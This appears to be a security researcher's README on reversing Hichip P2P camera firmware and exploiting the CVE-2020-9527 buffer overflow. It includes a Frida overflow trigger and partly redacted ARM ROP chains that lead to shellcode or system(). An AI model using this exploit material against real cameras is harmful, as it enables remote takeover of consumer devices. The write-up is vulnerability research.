<h1 align="center">
  <br>Hichip P2P firmware RCE</br>
</h1>

<h3 align="center">
Exploit development and reversing of Hichip's P2P camera firmware
</h3>

<p align="center">
  <strong>
  <a href="https://asciinema.org/a/BCJBjFcrns6RJKqTjr4tkK8xs">
    POC
  </a>,
  <a href="https://twitter.com/0xedh">
    Twitter
  </a>,
  <a href="https://pax0r.com/">
    Pax0r
  </a>
  </strong>
</p>

<p align="center">
  <a href="https://asciinema.org/a/BCJBjFcrns6RJKqTjr4tkK8xs">
    <img src="https://user-images.githubusercontent.com/50701542/99964547-bd0b2a00-2d93-11eb-9730-efa7e1542324.png" width="700" />
  </a>
</p>

## Contents index

- [Overview](#Overview)
- [CamHI applications analysis](#CamHI)
- [Firmware analysis](#Firmware)
- [Exploitation](#Exploitation)
    - [1st approach](#1st)
    - [2nd approach](#2nd)
- [References](#References)
- [Bonus](#Bonus)

## Overview

First of all, thanks to the researcher @pmarrapese and his awesome #DEFCONSafeMode talk. He is the original discoverer of these vulnerabilities and others.

Regarding to CVE-MITRE:

>CVE-2020-9527: Firmware developed by Shenzhen Hichip Vision Technology (V6 through V20, after 2018-08-09 through 2020), as used by many different vendors in millions of Internet of Things devices, suffers from buffer overflow vulnerability that allows unauthenticated remote attackers to execute arbitrary code via the peer-to-peer (P2P) service. This affects products marketed under the following brand names: Accfly, Alptop, Anlink, Besdersec, BOAVISION, COOAU, CPVAN, Ctronics, D3D Security, Dericam, Elex System, Elite Security, ENSTER, ePGes, Escam, FLOUREON, GENBOLT, Hongjingtian (HJT), ICAMI, Iegeek, Jecurity, Jennov, KKMoon, LEFTEK, Loosafe, Luowice, Nesuniq, Nettoly, ProElite, QZT, Royallite, SDETER, SV3C, SY2L, Tenvis, ThinkValue, TOMLOV, TPTEK, WGCC, and ZILINK.

So millions of devices without automatic updates which don't need to be directly exposed to the internet or a controlled LAN to be exploited, due to P2P hole punching behavior, are vulnerable to a pre-auth remote code execution, nice.

## CamHI

To understand how the camera's management and authentication mechanisms works it has been useful to analyze the official application statically and dynamically. To keep it simple, here we'll only describe a partial analysis of the Android CamHI application. There are other applications to interact with the camera designed to work with other operative systems that could be helpful too. We also need to perform network analysis while the application is running, for this matter two custom Wireshark dissectors have been helpful:

* https://github.com/fbertone/32100-dissector
* https://github.com/pmarrapese/iot/tree/master/p2p/dissector

After decompile the application we can start to understand how it works:

```java
private void login_NewEXT(int i) {
--- SNIP ---
    if (getUid().length() < 10) {
        this.login_EXT = -1;
        bArr = bArr5;
    } else {
        if (0 == this.p2penhand) {
            this.p2penhand = DoAes.P2PInitEDncrypt();
            DoAes.InitMutex(this.p2penhand);
            HiLog.e(getUid() + "::::::::::" + this.p2penhand + ":::::", 1, 0);
        }
        if (this.p2penhand != 0) {
            long P2PInitEDncryptpwdExt = DoAes.P2PInitEDncryptpwdExt(this.p2penhand, getUid(), this.mPassword, this.mUsername, this.outRand);
            HiLog.e(getUid() + "::::::::::" + this.p2penhand + ":::::" + P2PInitEDncryptpwdExt + "::" + this.outRand[0] + "::" + this.outRand[1] + "::" + this.outRand[2] + "::" + this.outRand[3], 1, 0);
------>     DoAes.P2PEDncrypt2Ext(this.p2penhand, 0, getUid(), this.mPassword, this.mPassword.length(), 1, bArr6);
            StringBuilder sb = new StringBuilder();
            sb.append(getUid());
            sb.append("::::::::::");
            sb.append(this.p2penhand);
            HiLog.e(sb.toString(), 1, 0);
            bArr = bArr5;
            DoAes.P2PEDncrypt2Ext(this.p2penhand, 0, getUid(), this.mUsername, this.mUsername.length(), 0, bArr5);
        } else {
            bArr = bArr5;
            this.login_EXT = -1;
        }
    }
----> byte[] parseContent = HiChipDefines.HI_P2P_ENCRIPT_LONGIN_INFO.parseContent(0, bArr, bArr6);
    if (i != 1) {
------> sendIOCtrl(4096, parseContent);
    } else {
        sendIOCtrl(18459, parseContent);
    }
}
```

The method **login_NewEXT** in the class **com.hichip.control.HiCamera** handle the authentication. First, it defines some bytearrays that will serve as parameters in **DoAes.P2PEDncrypt2Ext**. Some of these parameters are the username and the password configured in the camera. After that, the result of **DoAes.P2PEDncrypt2Ext** is used as argument in **HiChipDefines.HI_P2P_ENCRIPT_LONGIN_INFO.parseContent** and at last, the resultant bytearray **parseContent** is used in **sendIOCtrl**. This will be interesting in a dynamic analysis approach, because if we hook **sendIOCtrl** we can modify the sent data on the fly.

We notice the use of AES encryption in the previous code snippet, I haven't done much research on this matter, but maybe someone might find the following helpful:

<p align="center">
    <img src="https://user-images.githubusercontent.com/50701542/98139841-f2bfa000-1ec4-11eb-82fd-84845b6d35fb.png" />
</p>

If we take a look in Wireshark, we can see the encrypted stream:

<p align="center">
    <img src="https://user-images.githubusercontent.com/50701542/98142802-92326200-1ec8-11eb-8ab3-51442a9253b3.png" />
</p>

But if our camera act as SuperNode, we can get some UIDs from others cameras:

<p align="center">
    <img src="https://user-images.githubusercontent.com/50701542/98144128-4b456c00-1eca-11eb-993a-272f720be4c0.png" />
</p>

With this information in mind, let's analyze the firmware.

## Firmware

My target device was a IEGEEK camera with firmware version V20.1.31.15.27-20191216. To statically analyze the binaries in charge of handle the services and the configuration files in the camera, we first need to obtain them from the EEPROM via SPI or other methods. After disassembling the camera, we spot a XM25QH128A EEPROM. This is a 16MBytes SPI compatible flash without pullup resistor. The pinout schema is well-known:

<p align="center">
    <img src="https://user-images.githubusercontent.com/50701542/98112462-8df34e00-1ea2-11eb-9b6f-d0dffd13e56b.png" alt="drawing" width="200" /><img src="https://user-images.githubusercontent.com/50701542/98113285-bb8cc700-1ea3-11eb-8d44-6ec69d86ba05.png" />
</p>


I will not cover the firmware dumping process here, there are a lot of resources publicly available, so let's investigate the filesystem.

~~~
System startup

Uncompress Ok!

U-Boot 2016.11 (Apr 03 2019 - 18:54:33 +0800)hi3516ev200

Relocation Offset is: 0375e000
Relocating to 43f5e000, new gd at 43f1def0, sp at 43f1ded0
SPI Nor:  Check Flash Memory Controller v100 ... Found
SPI Nor ID Table Version 1.0
SPI Nor(cs 0) ID: 0x20 0x70 0x18
Block:64KB Chip:16MB Name:"XM25QH128A"
SPI Nor total size: 16MB
NAND:  0 MiB
In:    serial
Out:   serial
Err:   serial
Net:   eth0
Hit any key to stop autoboot:  0
### Please input uboot password: ###
**********
hisilicon #
~~~
After setting up bootargs via UBOOT with UBOOT password recovered from the flash dump (the password is also available on the internet), we can start interacting with the startup scripts and binaries.
~~~
usb usb2: We don't know the algorithms for LPM for this host, disabling LPM.
hub 2-0:1.0: USB hub found
hub 2-0:1.0: hub can't support USB3.0
hibvt_rtc 120e0000.rtc: rtc core: registered 120e0000.rtc as rtc0
hibvt_rtc 120e0000.rtc: RTC driver for hibvt enabled
i2c /dev entries driver
hibvt-i2c 12060000.i2c: hibvt-i2c0@100000hz registered
hibvt-i2c 12061000.i2c: hibvt-i2c1@100000hz registered
hibvt-i2c 12062000.i2c: hibvt-i2c2@100000hz registered
sdhci: Secure Digital Host Controller Interface driver
sdhci: Copyright(c) Pierre Ossman
sdhci-pltfm: SDHCI platform and OF driver helper
mmc0: SDHCI controller on 10010000.sdhci [10010000.sdhci] using ADMA in legacy mode
NET: Registered protocol family 17
NET: Registered protocol family 15
lib80211: common routines for IEEE802.11 drivers
hibvt_rtc 120e0000.rtc: setting system clock to 1970-01-01 00:00:11 UTC (11)
mmc0: new high speed SDXC card at address e624
mmcblk0: mmc0:e624 SC64G 59.5 GiB
 mmcblk0: p1
VFS: Mounted root (jffs2 filesystem) on device 31:2.
Freeing unused kernel memory: 144K (c03e4000 - c0408000)
This architecture does not have kernel memory protection.
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
/ #
~~~

There are some interesting files at this point:

- /mnt/mtd/ipc/ipc_server -> This handles webserver, authentication, camera settings and P2P stuff.
- /etc/starts -> Starts boot script, more concretely /mnt/mtd/ipc/run.
- /mnt/mtd/ipc/run -> Starts boot scripts, network, ipc_server, etc.
- libXqAPILib.so -> Imports by ipc_server.
- libxqun.so -> Imports by ipc_server.
- libuClibc-0.9.33.2.so -> Libc version.

It's important to point out that ipc_server has a watchdog service and if a thread stop working, via attaching a debugger or due to a SIGSEV, the camera will reboot.

As @pmarrapese explained, there is a buffer overflow in HI_P2P_Cmd_Process:

<p align="center">
    <img src="https://user-images.githubusercontent.com/50701542/99964062-0313be00-2d93-11eb-9413-dc76a6880dc1.png" width="500" />
</p>

Because the check in H2_P2P_Cmd_ReadRequest is 10 times the size of the buffer:

<p align="center">
    <img src="https://user-images.githubusercontent.com/50701542/99964065-04dd8180-2d93-11eb-9409-260a1cdb18b4.png" width="500" />
</p>

At this point we have almost all we need to start the exploit development process.

## Exploitation

The final exploit included in this repository has some offsets and base addresses redacted for obvious reasons, but with the information within you can make it working as an unauthenticated NAT-bypassing RCE.

For testing reasons, the following Frida script was used in conjuction with Android CamHI apk to trigger the buffer overflow:

```java
Java.perform(function(){
	console.log("OK");
	var p2penc = Java.use("com.hichip.control.HiCamera");
	p2penc.sendIOCtrl.overload("int","[B").implementation = function(x,y){
		console.log("int: \n"+x +"\nbytearray: \n"+y);
		if (y != null) {
			var buffer = Java.array('byte', y);
			console.log(buffer.length);
			var result = "";
			for(var i = 0; i < buffer.length; ++i){
			    result+= (buffer[i] & 0xff).toString(16);
			}
			console.log(result);
		}
		var buffer2 = Java.array('byte', [ 41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,
*** SNIP ***
    41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41 ]);
		return this.sendIOCtrl(x,buffer2)
	}
})
```

After confirm the overflow I wrote a dirty P2P client in python that does the following:

1. msg_hello -> msg_hello_ack
2. msg_p2p_req
3. msg_list_req1
4. msg_rly_hello
5. msg_rly_port
6. msg_rly_req
7. msg_rly_pkt -> msg_rly_rdy
8. send payloads

But first let check the binaries security properties with checksec:

<p align="center">
    <img src="https://user-images.githubusercontent.com/50701542/99968157-1164d880-2d99-11eb-8d1b-98a0c9d1ecba.png"  />
</p>

We haven't too many options to get a reverse shell from the camera. I mean, /dev/tcp is not present, nor perl, php, python, netcat, java and so on. This leaves us two options at least:

- Disable ASLR making /etc/starts to write 0 at /proc/sys/kernel/randomize_va_space via ret2plt in ipc_server (No PIE). Due to the watchdog I mentioned before the camera will restart, but /etc/starts will disable ASLR at startup before ipc_server is called. After that, we can call mprotect with with the appropriate parameters and make a segment of the stack executable, where our shellcode resides.


- Find offset to system at PLT or GOT in ipc_server (No PIE), point r0 to $SP + x and write our elf here. There are not much reverse shell options in the filesystem, so we can write our own binary and make it starts at next reboot. You can see what I mean by looking at the annotations in the repository script.

### 1st

Gadgets for mprotect metod:

~~~
#mprotect, r0 = aligned(4096)stack_addr, r1 = 0x01010101 , r2 = 7
(LIBC_BASE + 0x000385c8) #libc 0x000385c8: pop {r4, lr}; bx lr;
(0x44444444)
(LIBC_BASE + 0x000015a3) #libc thumb 0x000015a2 (0x000015a3): adds r1, #0xed; pop {r2, r5, r7, pc};
(0xFFFFFFFF) # 0xffffffff + 0x08 = 4294967303 = 0x100000007
(0x55555555)
#r2
#add 0x01 8 times because I didn't found a better way
(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc}; ------
(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
(0x11111111)                                                                         #<----
(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
(0x11111111)
(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
(0x11111111)
(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
(0x11111111)
(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
(0x11111111)
(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
(0x11111111)
(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
(0x11111111)
(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
(0x11111111)
(0x77777777)

#go to the next mprotect argument, r0

(LIBC_BASE + 0x000385c8) #libc 0x000385c8: pop {r4, lr}; bx lr;
(0x44444444)
#r0
(LIBC_BASE + 0x0005e0cc)#libc 0x0005e0cc: pop {r1, pc};
(0xFFFFF001) #value to align  R0 && R1 (0xFFFFF001 - LSB of SP will always be 0)
(LIBC_BASE + 0x000385c8) #libc 0x000385c8: pop {r4, lr}; bx lr;
(0x44444444)

(LIBC_BASE + 0x0002063d)#libc THUMB 0x0002063c (0x0002063d): pop {r3, pc};
(LIBC_BASE + 0x02020202)#libc THUMB 0x0001c6b4 (0x0001c6b5): pop {r3, r5, pc}             <--- #DOITYOURSELF
(LIBC_BASE + 0x00045170)#libc 0x00045170: add r0, sp, #4; blx r3;    # r0 = $sp+4          ---
(LIBC_BASE + 0x00012134)#libc #align stack 0x00012134: and r0, r0, r1; bx lr;  #THIS TO R3 via redirected #DOITYOURSELF from 45170
(0x55555555)
(LIBC_BASE + 0x0003c9ac)#libc 0x0003c9ac: pop {r4, lr}; bx r3; #to fix lr
(0x44444444)
(LIBC_BASE + 0x0005e0cc)#libc 0x0005e0cc: pop {r1, pc};  #NEW LR, reached from 12134
#r1
(0x01010101) #size to mprotect
(LIBC_BASE + 0xe76c) #mprotect
"""
gef➤  xinfo $sp
──────────────────────────────────────────────────────────── xinfo: 0x833d3fac ────────────────────────────────────────────────────────────
Page: 0x833d3000  →  0x843e4000 (size=0x1011000)
Permissions: rwx
Pathname:
Offset (from page): 0xfac
Inode: 0


#buff+= hextobytearray(0x88888888)
#buff+= hextobytearray(0x88888888)
"""
(0x41414141)
(LIBC_BASE + 0x000385c8) #libc 0x000385c8: pop {r4, lr}; bx lr;
(0x41414141)
(LIBC_BASE + 0x00026c71)#libc THUMB 0x00026c70 (0x00026c71): bx sp;
(f_shellcode)


~~~

### 2nd

Gadgets for ret2plt method:

~~~
(0x0003b290)#0x0003b290: pop {r4, r5, r6, r7, pc};
(0x44444444)
(0x55555555)
(0x66666666)
(0x00039c6c)#0x00039c6c: pop {r4, pc};
(0x02020202)#0x0008b588: add r0, sp, #0x4c; blx r7; #DOITYOURSELF
(0x44444444)
(0x02020202)#ipc_server system @PLT #DOITYOURSELF
("45" * 76) #0x4c
(BUFF)
~~~

And that's all, thanks for reading. All improvements are welcome. You can contact me on twitter @0xedh.

## References

* https://hacked.camera/
* https://github.com/fbertone/32100-dissector
* https://github.com/pmarrapese/iot/tree/master/p2p/dissector

## Bonus

I found another different crash in the process. It needs more investigation:

<p align="center">
    <img src="https://user-images.githubusercontent.com/50701542/99973616-3e68b980-2da0-11eb-88d8-1b4b35d3510b.png" width="500" />
</p>
